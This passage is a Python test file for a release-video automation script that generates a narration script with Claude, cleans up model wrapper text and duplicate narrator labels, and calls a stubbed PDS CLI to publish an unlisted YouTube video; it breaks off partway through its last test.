import builtins
import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "release_video.py"


def release_video_env(extra: dict | None = None) -> dict:
    env = {**os.environ}
    for key in (
        "CLAUDE_MODEL",
        "CLAUDE_TIMEOUT",
        "CLAUDE_CODE_OAUTH_TOKEN",
        "CLAUDE_CODE_OAUTH_TOKEN_1",
        "CLAUDE_CODE_OAUTH_TOKEN_2",
        "CLAUDE_CODE_OAUTH_TOKEN_3",
        "RELEASE_VIDEO_ATTEMPT_ID",
        "RELEASE_VIDEO_CLAUDE_TOOLS",
        "RELEASE_VIDEO_IDEMPOTENCY_KEY",
        "RELEASE_VIDEO_IDEMPOTENCY_PROVENANCE",
        "RELEASE_VIDEO_PROMPT_TEMPLATE",
        "RELEASE_VIDEO_BOOTSTRAP_SELECTED_PROJECT",
        "RELEASE_VIDEO_FORCE_REGENERATE",
        "RELEASE_VIDEO_METADATA_CONFLICT",
        "RELEASE_VIDEO_SCRIPT_PATH",
        "PDS_API_URL",
        "PDS_PROFILE",
        "PDS_RELEASE_TOKEN",
        "PDS_TOKEN",
        "CI",
        "GITHUB_ACTIONS",
    ):
        env.pop(key, None)
    if extra:
        env.update(extra)
    return env


def run(command, cwd: Path, **kwargs):
    return subprocess.run(
        command,
        cwd=cwd,
        text=True,
        capture_output=True,
        check=True,
        **kwargs,
    )


def write_executable(path: Path, content: str) -> Path:
    path.write_text(content, encoding="utf8")
    path.chmod(0o755)
    return path


def init_release_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    run(["git", "-c", "init.defaultBranch=main", "init"], repo)
    run(["git", "config", "user.email", "release@example.test"], repo)
    run(["git", "config", "user.name", "Release Bot"], repo)
    run(["git", "remote", "add", "origin", "https://github.com/promptdriven/pdd.git"], repo)

    (repo / "CHANGELOG.md").write_text(
        "# Changelog\n\n## Unreleased\n\n- Add release video automation.\n",
        encoding="utf8",
    )
    (repo / "pdd.py").write_text("print('first')\n", encoding="utf8")
    run(["git", "add", "."], repo)
    run(["git", "commit", "-m", "initial release"], repo)
    run(["git", "tag", "-a", "v1.0.0", "-m", "Release v1.0.0"], repo)

    (repo / "pdd.py").write_text("print('second')\n", encoding="utf8")
    run(["git", "add", "."], repo)
    run(["git", "commit", "-m", "add release video automation"], repo)
    run(["git", "tag", "-a", "v1.1.0", "-m", "Release v1.1.0"], repo)
    return repo


def claude_stub(tmp_path: Path) -> Path:
    return write_executable(
        tmp_path / "claude-stub.py",
        """#!/usr/bin/env python3
import json
import pathlib
import sys

prompt = sys.stdin.read()
pathlib.Path("claude_prompt.txt").write_text(prompt, encoding="utf8")
pathlib.Path("claude_argv.json").write_text(json.dumps(sys.argv[1:], indent=2), encoding="utf8")
print("# PDD v1.1.0 Release Video\\n\\n"
      "Hook: This release turns the PDD release process into a publishable video story.\\n\\n"
      "Narration: PDD v1.1.0 adds release video automation, using release context to create a concise update for developers. "
      "The video shows the changed files, the release tag, and the path from script to YouTube upload. "
      "It closes with a reminder that the release artifact and the release story now ship together.\\n\\n"
      "Visual direction: show the changelog, a terminal running make release, and the uploaded YouTube receipt.")
""",
    )


def claude_failure_stub(tmp_path: Path, stderr: str, exit_code: int = 1) -> Path:
    return write_executable(
        tmp_path / "claude-failure-stub.py",
        f"""#!/usr/bin/env python3
import sys

sys.stderr.write({stderr!r})
raise SystemExit({exit_code})
""",
    )


def claude_output_stub(tmp_path: Path, stdout: str) -> Path:
    return write_executable(
        tmp_path / "claude-output-stub.py",
        f"""#!/usr/bin/env python3
import sys

sys.stdout.write({stdout!r})
""",
    )


def reusable_script_text() -> str:
    return """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 ships release video automation so maintainers can publish a clear story for every CLI release without changing the package publishing path.

VISUAL: show the release tag, changelog excerpt, and terminal command side by side.

## Details

NARRATOR:
The script highlights what changed, why it matters for developers, and how the generated release artifact flows into the PDS publish step for an unlisted YouTube video.

VISUAL: show the PDS response with the YouTube URL ready for release notes.
"""


def load_release_video_module():
    spec = importlib.util.spec_from_file_location("release_video", SCRIPT)
    assert spec is not None
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def pds_stub(tmp_path: Path, response: dict) -> Path:
    response_literal = repr(response)
    return write_executable(
        tmp_path / "pds-stub.py",
        f"""#!/usr/bin/env python3
import json
import os
import pathlib
import sys

capture = pathlib.Path(os.environ["PDS_STUB_CAPTURE"])
capture.write_text(json.dumps({{"argv": sys.argv[1:]}}, indent=2), encoding="utf8")
print(json.dumps({response_literal}))
""",
    )


def pds_output_stub(
    tmp_path: Path,
    *,
    stdout: str = "",
    stderr: str = "",
    exit_code: int = 0,
) -> Path:
    return write_executable(
        tmp_path / "pds-output-stub.py",
        f"""#!/usr/bin/env python3
import json
import os
import pathlib
import sys

capture = pathlib.Path(os.environ["PDS_STUB_CAPTURE"])
capture.write_text(json.dumps({{"argv": sys.argv[1:]}}, indent=2), encoding="utf8")
sys.stdout.write({stdout!r})
sys.stderr.write({stderr!r})
raise SystemExit({exit_code})
""",
    )


def pds_idempotency_key(capture: Path) -> str:
    pds_call = pds_capture_argv(capture)
    return pds_call[pds_call.index("--idempotency-key") + 1]


def pds_capture_argv(capture: Path) -> list[str]:
    return json.loads(capture.read_text(encoding="utf8"))["argv"]


def run_release_video_with_existing_script(
    tmp_path: Path,
    *,
    extra_args: list[str] | None = None,
    env_extra: dict | None = None,
) -> tuple[subprocess.CompletedProcess[str], Path]:
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env(
        {
            "PDS_STUB_CAPTURE": str(capture),
            **(env_extra or {}),
        }
    )
    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {
                        "ok": True,
                        "summary": {"youtubeUrl": "https://youtu.be/recovery"},
                    },
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
            *(extra_args or []),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )
    return result, capture


def test_release_video_generates_script_and_invokes_pds_publish(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})
    pds = pds_stub(
        tmp_path,
        {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/pdd-release"}},
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude_stub(tmp_path)),
            "--pds-cli",
            str(pds),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert "https://youtu.be/pdd-release" in result.stdout
    output_dir = tmp_path / "videos" / "v1.1.0"
    script_text = (output_dir / "release_video_script.md").read_text(encoding="utf8")
    assert script_text.startswith("# PDD v1.1.0 Release Video")
    assert "\n## Release Overview (0:00 - 1:00)" in script_text
    assert "\nNARRATOR:\n" in script_text
    assert "\nVISUAL: show the changelog" in script_text
    claude_prompt = (repo / "claude_prompt.txt").read_text(encoding="utf8")
    assert "Research requirement:" in claude_prompt
    assert "Business-value requirements:" in claude_prompt
    assert "Visual requirements:" in claude_prompt
    assert "what changed, why it matters, and the practical business value" in claude_prompt
    assert "## Release hook (0:00 - 0:12)" in claude_prompt
    assert "Every spoken narration block starts with `NARRATOR:` on its own line." in claude_prompt
    assert "release video automation" in claude_prompt
    claude_argv = json.loads((repo / "claude_argv.json").read_text(encoding="utf8"))
    assert claude_argv[claude_argv.index("--model") + 1] == "claude-opus-4-8"
    assert "--allowedTools" not in claude_argv
    pds_call = json.loads(capture.read_text(encoding="utf8"))["argv"]
    assert pds_call[:2] == ["release-video", "create"]
    assert pds_call[pds_call.index("--target") + 1] == "publish"
    assert pds_call[pds_call.index("--platform") + 1] == "youtube"
    assert pds_call[pds_call.index("--privacy") + 1] == "unlisted"
    assert pds_call[pds_call.index("--release-tag") + 1] == "v1.1.0"
    assert pds_call[pds_call.index("--repo-name") + 1] == "promptdriven/pdd"
    idempotency_key = pds_call[pds_call.index("--idempotency-key") + 1]
    assert idempotency_key.startswith("pdd-release-video:v1.1.0:")


def test_release_video_sanitizes_generated_script_before_invoking_pds(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    raw_script = """Here is the release video script you asked for:

# PDD v1.1.0 Release Video

## Opening

NARRATOR:
NARRATOR:
PDD v1.1.0 turns the release notes into a short operator-ready video story that tells maintainers what shipped, why it matters, and how the release path changed.

VISUAL: show the release tag, changelog excerpt, and terminal command side by side.

## Reliability

NARRATOR: NARRATOR: The release path now keeps generated assets, PDS run state, and publishing evidence together so recovery work can continue without guessing which artifact was sent downstream.

VISUAL: show the PDS status JSON, the persisted run metadata, and the final YouTube receipt.

Let me know if you want a punchier version.
"""
    pds = pds_stub(
        tmp_path,
        {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/sanitized"}},
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--claude-cli",
            str(claude_output_stub(tmp_path, raw_script)),
            "--pds-cli",
            str(pds),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    assert "https://youtu.be/sanitized" in result.stdout
    output_dir = tmp_path / "videos" / "v1.1.0"
    raw_artifact = (output_dir / "release_video_script.raw.md").read_text(encoding="utf8")
    script_text = (output_dir / "release_video_script.md").read_text(encoding="utf8")
    validation = json.loads(
        (output_dir / "release_video_script_validation.json").read_text(encoding="utf8")
    )
    pds_call = pds_capture_argv(capture)
    sent_script = Path(pds_call[pds_call.index("--script") + 1]).read_text(encoding="utf8")

    assert "Here is the release video script" in raw_artifact
    assert "Here is the release video script" not in script_text
    assert "Let me know if you want" not in script_text
    assert "NARRATOR: NARRATOR:" not in script_text
    assert "\nNARRATOR:\n\nNARRATOR:\n" not in script_text
    assert sent_script == script_text
    assert validation["normalized"] is True
    assert "stripped_model_wrapper_text" in validation["changes"]
    assert "collapsed_duplicate_narrator_labels" in validation["changes"]
    assert validation["checks"]["hasNoModelWrapperText"] is True
    assert validation["checks"]["hasNoDuplicateNarratorLabels"] is True
    assert validation["errors"] == []


def test_release_video_preserves_exact_raw_claude_output_artifact(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    raw_script = """```markdown
# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps exact raw script diagnostics while sending a normalized script
to PDS, so release recovery can compare the generated content with the content
that downstream systems received.

VISUAL: show raw and normalized script artifacts side by side.

## Recovery

NARRATOR:
Operators can inspect the raw Claude output, the final script, and validation
metadata without guessing which transformation happened before PDS create.

VISUAL: show the validation JSON and PDS create command.
```
"""

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--claude-cli",
            str(claude_output_stub(tmp_path, raw_script)),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/raw"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    output_dir = tmp_path / "videos" / "v1.1.0"
    assert (output_dir / "release_video_script.raw.md").read_text(encoding="utf8") == raw_script
    normalized = (output_dir / "release_video_script.md").read_text(encoding="utf8")
    assert not normalized.startswith("```")
    assert "PDD v1.1.0 keeps exact raw script diagnostics" in normalized


def test_release_video_strips_wrapped_markdown_fence_from_final_script():
    release_video = load_release_video_module()
    script = """Here is the release video script:

```markdown
# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps release-video recovery visible with durable scripts, status
metadata, and validation evidence that helps maintainers recover failed
publishes without guessing.

VISUAL: show the release artifacts and PDS status side by side.

## Close

NARRATOR:
Operators can query the persisted PDS run, inspect the final script sent
downstream, and connect the YouTube receipt back to the release notes.

VISUAL: show the terminal status and YouTube URL.
```

Let me know if you want a shorter version.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "```" not in artifacts["script"]
    assert "Here is the release video script" not in artifacts["script"]
    assert "Let me know if you want" not in artifacts["script"]
    assert artifacts["validation"]["checks"]["hasNoMarkdownFences"] is True
    assert artifacts["validation"]["errors"] == []


def test_release_video_rejects_mid_document_model_wrapper_text():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps release-video recovery visible with durable scripts, status
metadata, and validation evidence that helps maintainers recover failed
publishes without guessing.

VISUAL: show the release artifacts and PDS status side by side.

Sure, here is the next section of the release-video script:

## Close

NARRATOR:
Operators can query the persisted PDS run, inspect the final script sent
downstream, and connect the YouTube receipt back to the release notes.

VISUAL: show the terminal status and YouTube URL.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert artifacts["validation"]["checks"]["hasNoModelWrapperText"] is False
    assert "hasNoModelWrapperText" in artifacts["validation"]["errors"]


def test_release_video_strips_common_assistant_preamble():
    release_video = load_release_video_module()
    script = """Below is the release video script you requested:

# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps release-video recovery visible with durable scripts, status
metadata, and validation evidence that helps maintainers recover failed
publishes without guessing.

VISUAL: show the release artifacts and PDS status side by side.

## Close

NARRATOR:
Operators can query the persisted PDS run, inspect the final script sent
downstream, and connect the YouTube receipt back to the release notes.

VISUAL: show the terminal status and YouTube URL.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Below is the release video script" not in artifacts["script"]
    assert artifacts["validation"]["changes"] == ["stripped_model_wrapper_text"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_strips_additional_assistant_preamble_variants():
    release_video = load_release_video_module()
    preambles = [
        "I've drafted the release video script below:",
        "I drafted the release video script below:",
        "I prepared the release video script below:",
        "I created the release video script below:",
        "I wrote the release video script below:",
        "Absolutely, here's the release video script:",
        "Here\u2019s the release video script:",
        "Below you'll find the release video script:",
    ]

    for preamble in preambles:
        script = f"""{preamble}

# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps release-video recovery visible with durable scripts, status
metadata, and validation evidence that helps maintainers recover failed
publishes without guessing.

VISUAL: show the release artifacts and PDS status side by side.

## Close

NARRATOR:
Operators can query the persisted PDS run, inspect the final script sent
downstream, and connect the YouTube receipt back to the release notes.

VISUAL: show the terminal status and YouTube URL.
"""

        artifacts = release_video.prepare_release_video_script(script, source="test")

        assert preamble not in artifacts["script"]
        assert "stripped_model_wrapper_text" in artifacts["validation"]["changes"]
        assert artifacts["validation"]["errors"] == []


def test_release_video_rejects_wrapper_text_inside_narrator_block():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps release-video recovery visible with durable scripts, status
metadata, and validation evidence that helps maintainers recover failed
publishes without guessing.

VISUAL: show the release artifacts and PDS status side by side.

## Close

NARRATOR:
Sure, here is the next section of the release-video script:
Operators can query the persisted PDS run, inspect the final script sent
downstream, and connect the YouTube receipt back to the release notes.

VISUAL: show the terminal status and YouTube URL.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert artifacts["validation"]["checks"]["hasNoModelWrapperText"] is False
    assert "hasNoModelWrapperText" in artifacts["validation"]["errors"]


def test_release_video_preserves_valid_here_is_narration_line():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
Here is the command maintainers run after tagging a release, and the reason it
matters for recovery: the release-video wrapper keeps PDS status, scripts, and
validation evidence together.

VISUAL: show make release-video-status output beside pds_run.json.

## Close

NARRATOR:
The recovery artifacts stay readable and complete, so operators can reattach to
the release run without depending on stale local profile state.

VISUAL: show the refreshed terminal status and YouTube URL.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Here is the command maintainers run" in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_preserves_trailing_here_is_narration_line():
    release_video = load_release_video_module()
    script = "\n".join(
        [
            "# PDD v1.1.0 Release Video",
            "",
            "## Opening",
            "",
            "NARRATOR:",
            "PDD v1.1.0 keeps release recovery visible with durable scripts and",
            "status evidence for maintainers who need to debug failed video publishes.",
            "",
            "VISUAL: show the release context, normalized script, and pds_run.json.",
            "",
            "## Close",
            "",
            "NARRATOR:",
            (
                "Here is the takeaway: v1.1.0 gives maintainers a recoverable "
                "release-video path with clear artifacts and durable PDS status."
            ),
        ]
    )

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Here is the takeaway" in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_preserves_blank_after_label_trailing_here_is_narration():
    release_video = load_release_video_module()
    script = "\n".join(
        [
            "# PDD v1.1.0 Release Video",
            "",
            "## Opening",
            "",
            "NARRATOR:",
            "PDD v1.1.0 keeps release recovery visible with durable scripts and",
            "status evidence for maintainers who need to debug failed video publishes.",
            "",
            "VISUAL: show the release context, normalized script, and pds_run.json.",
            "",
            "## Close",
            "",
            "NARRATOR:",
            "",
            (
                "Here is the takeaway: v1.1.0 gives maintainers a recoverable "
                "release-video path with clear artifacts, validation evidence, "
                "and durable PDS status."
            ),
        ]
    )

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Here is the takeaway" in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_preserves_multiparagraph_trailing_here_is_narration():
    release_video = load_release_video_module()
    script = "\n".join(
        [
            "# PDD v1.1.0 Release Video",
            "",
            "## Opening",
            "",
            "NARRATOR:",
            "PDD v1.1.0 keeps release recovery visible with durable scripts and",
            "status evidence for maintainers who need to debug failed video publishes.",
            "",
            "VISUAL: show the release context, normalized script, and pds_run.json.",
            "",
            "## Close",
            "",
            "NARRATOR:",
            "The closing paragraph summarizes the publish recovery path and why the",
            "generated assets matter to maintainers during a release incident.",
            "",
            (
                "Here is the takeaway: v1.1.0 gives maintainers a recoverable "
                "release-video path with clear artifacts, validation evidence, "
                "and durable PDS status after a failed PDS publish."
            ),
        ]
    )

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "The closing paragraph summarizes" in artifacts["script"]
    assert "Here is the takeaway" in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_preserves_plain_narration_before_first_visual():
    release_video = load_release_video_module()
    script = """Hook: PDD v1.1.0 turns release-video recovery into an operator-visible
path instead of a best-effort publish step that can fail without enough context.

Narration: The release wrapper now keeps generated scripts, validation evidence,
PDS run handles, status query diagnostics, and recovery commands together before
the publish request reaches PDS. Maintainers can reattach to the same run, see
whether a running sidecar is stale, and retry with a stable idempotency key
without regenerating the release story or losing the incident trail.

Visual direction: show the changelog, generated script, pds_run.json, status
query output, and final YouTube receipt side by side.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Hook: PDD v1.1.0 turns release-video recovery" in artifacts["script"]
    assert "Narration: The release wrapper now keeps generated scripts" in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_preserves_plain_preamble_before_first_narrator_label():
    release_video = load_release_video_module()
    script = """Hook: PDD v1.1.0 makes release-video recovery explicit for
maintainers before the first formal narrator block appears.

NARRATOR:
The release-video workflow now preserves enough diagnostics for operators to
recover a failed publish without guessing. Generated scripts, validation
evidence, PDS run handles, and status query diagnostics stay attached to the
release attempt so maintainers can continue recovery with a stable audit trail.

VISUAL: show release artifacts, pds_run.json, and a terminal status query.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Hook: PDD v1.1.0 makes release-video recovery explicit" in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_strips_final_assistant_footer_after_narrator_block():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
PDD v1.1.0 keeps release recovery visible with durable scripts and status
evidence for maintainers who need to debug failed video publishes.

VISUAL: show the release context, normalized script, and pds_run.json.

## Close

NARRATOR:
The closing paragraph summarizes the publish recovery path and why generated
assets matter to maintainers during a release incident.

Let me know if you want a punchier version.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "The closing paragraph summarizes" in artifacts["script"]
    assert "Let me know if you want" not in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_collapses_empty_duplicate_narrator_label():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
NARRATOR: NARRATOR:
The wrapper should collapse duplicate speaker labels even when the duplicated
label line has no narration body, because the final script is what PDS receives
for section specification and rendering.

VISUAL: show a cleaned narrator block in the script artifact.

## Recovery

NARRATOR:
The validation artifact records the normalization and the script stays free of
duplicated speaker labels before the create command runs.

VISUAL: show release_video_script_validation.json with no errors.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "NARRATOR: NARRATOR:" not in artifacts["script"]
    assert "collapsed_duplicate_narrator_labels" in artifacts["validation"]["changes"]
    assert artifacts["validation"]["checks"]["hasNoDuplicateNarratorLabels"] is True
    assert artifacts["validation"]["errors"] == []


def test_release_video_collapses_many_duplicate_narrator_labels():
    release_video = load_release_video_module()
    duplicated_labels = "NARRATOR:" + "\tNARRATOR:" * 40
    script = f"""# PDD v1.1.0 Release Video

## Opening

{duplicated_labels}
The wrapper should collapse a long repeated speaker-label run without relying
on a backtracking-heavy regular expression, because generated scripts can echo
speaker labels many times after a model formatting failure.

VISUAL: show the duplicate labels collapsed into one narrator block.

## Recovery

NARRATOR:
The final script remains readable, validation stays clean, and PDS receives one
stable narrator block instead of repeated labels.

VISUAL: show the validation JSON with no duplicate-label errors.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "\tNARRATOR:" not in artifacts["script"]
    assert "collapsed_duplicate_narrator_labels" in artifacts["validation"]["changes"]
    assert artifacts["validation"]["checks"]["hasNoDuplicateNarratorLabels"] is True
    assert artifacts["validation"]["errors"] == []


def test_release_video_normalizes_standalone_bold_narrator_labels():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

**NARRATOR:**
Opening narration should follow the narrator label without an extra markdown
marker in the spoken body, because generated scripts sometimes bold speaker
labels while keeping them on their own line.

VISUAL: show the release artifacts beside the PDS status JSON.

## Close

**NARRATOR:**
The workflow stores raw output, normalized narration, and validation evidence
before publish, keeping the release story auditable through recovery.

VISUAL: show the final YouTube receipt and validation file.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Opening narration should follow the narrator label" in artifacts["script"]
    assert "\n**\n" not in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_normalizes_spaced_standalone_bold_narrator_labels():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

**NARRATOR: **
Opening narration should follow the narrator label without a literal markdown
marker in the spoken body, even when generated scripts put whitespace before
the closing bold marker.

VISUAL: show the release artifacts beside the PDS status JSON.

## Close

**NARRATOR: **
The workflow stores raw output, normalized narration, and validation evidence
before publish, keeping the release story auditable through recovery.

VISUAL: show the final YouTube receipt and validation file.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Opening narration should follow the narrator label" in artifacts["script"]
    assert "\n**\n" not in artifacts["script"]
    assert "\n** The workflow" not in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_preserves_wrapped_script_with_bold_narrator_labels():
    release_video = load_release_video_module()
    script = """Here is the release video script you asked for:

**NARRATOR:**
Opening narration should be preserved because it explains the release value and
recovery path for maintainers before the first visual direction appears.

VISUAL: show the release artifacts beside the PDS status JSON.

**NARRATOR:**
The workflow stores raw output, normalized narration, and validation evidence
before publish, keeping the release story auditable through recovery.

VISUAL: show the final YouTube receipt and validation file.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "Here is the release video script" not in artifacts["script"]
    assert "Opening narration should be preserved" in artifacts["script"]
    assert "\n**\n" not in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_normalizes_spaced_inline_bold_narrator_labels():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

**NARRATOR: ** PDD v1.1.0 turns release-video recovery into a visible operator
path, with generated scripts, validation artifacts, and PDS run metadata
preserved before the publish step is allowed to continue.

VISUAL: show the normalized script beside the raw Claude output artifact.

## Recovery

**NARRATOR: ** The wrapper keeps narration labels out of the spoken body while
still providing the standalone narrator blocks PDS expects for scene generation
and video rendering.

VISUAL: show clean narrator blocks in the final script.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "\nNARRATOR:\nPDD v1.1.0 turns release-video recovery" in artifacts["script"]
    assert "\n** PDD v1.1.0 turns release-video recovery" not in artifacts["script"]
    assert "\n** The wrapper keeps narration labels" not in artifacts["script"]
    assert artifacts["validation"]["errors"] == []


def test_release_video_normalizes_inline_narrator_labels():
    release_video = load_release_video_module()
    script = """# PDD v1.1.0 Release Video

## Opening

NARRATOR: PDD v1.1.0 turns release-video recovery into a visible operator path,
with generated scripts, validation artifacts, and PDS run metadata preserved
before the publish step is allowed to continue.

VISUAL: show the normalized script beside the raw Claude output artifact.

## Recovery

NARRATOR: The wrapper keeps narration labels out of the spoken body while still
providing the standalone narrator blocks PDS expects for scene generation and
video rendering.

VISUAL: show clean narrator blocks in the final script.
"""

    artifacts = release_video.prepare_release_video_script(script, source="test")

    assert "\nNARRATOR:\nPDD v1.1.0 turns release-video recovery" in artifacts["script"]
    assert "\nNARRATOR: PDD v1.1.0 turns release-video recovery" not in artifacts["script"]
    assert "\nNARRATOR: The wrapper keeps narration labels" not in artifacts["script"]
    assert "collapsed_duplicate_narrator_labels" in artifacts["validation"]["changes"]
    assert artifacts["validation"]["checks"]["hasNoDuplicateNarratorLabels"] is True
    assert artifacts["validation"]["errors"] == []


def test_release_video_rejects_malformed_script_before_invoking_pds(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    output_dir = tmp_path / "videos"
    malformed_script = tmp_path / "malformed_release_video_script.md"
    malformed_script.write_text(
        """# PDD v1.1.0 Release Video

## Opening

NARRATOR:
This script is long enough to pass the old length check, but it never gives PDS
any visual direction. That means the wrapper should stop before create rather
than handing downstream systems an ambiguous narration-only artifact that an
operator must diagnose during release recovery.

## Details

NARRATOR:
The second section repeats the same problem with more words so the script
remains realistic, but it still lacks any visual cue or storyboard line. The
release-video wrapper must explain the missing contract field and keep
diagnostics on disk.
""",
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(malformed_script),
            "--pds-cli",
            str(pds_stub(tmp_path, {"ok": True})),
            "--output-dir",
            str(output_dir),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    assert result.returncode == 1
    assert "release-video script validation failed" in result.stderr
    assert not capture.exists()
    validation = json.loads(
        (output_dir / "v1.1.0" / "release_video_script_validation.json").read_text(
            encoding="utf8"
        )
    )
    assert validation["checks"]["hasVisual"] is False
    assert "hasVisual" in validation["errors"]


def test_release_video_default_idempotency_key_uses_tag_and_git_sha(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})
    pds = pds_stub(
        tmp_path,
        {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/default-key"}},
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(pds),
            "--output-dir",
            str(tmp_path / "videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )

    assert pds_idempotency_key(capture) == "pdd-release-video:v1.1.0:abc123def456:local"


def test_release_video_default_idempotency_key_separates_local_and_ci_provenance(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    existing_script = tmp_path / "existing_release_video_script.md"
    existing_script.write_text(reusable_script_text(), encoding="utf8")

    local_capture = tmp_path / "local-pds-capture.json"
    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--git-sha",
            "abc123def456",
            "--script-path",
            str(existing_script),
            "--pds-cli",
            str(
                pds_stub(
                    tmp_path,
                    {"ok": True, "summary": {"youtubeUrl": "https://youtu.be/local"}},
                )
            ),
            "--output-dir",
            str(tmp_path / "local-videos"),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(local_capture)}),
        check=True,
    )

    ci_capture = tmp_path / "ci-pds-capture.json"
    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
